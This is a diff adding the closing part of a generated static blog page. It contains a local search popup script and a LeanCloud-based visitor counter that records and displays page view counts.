+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3nEcwhMJTxkWHiNp8cMyOlAI-gzGzoHsz", "wxnCuxw6V0b0lAgx5kOUUOSp");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
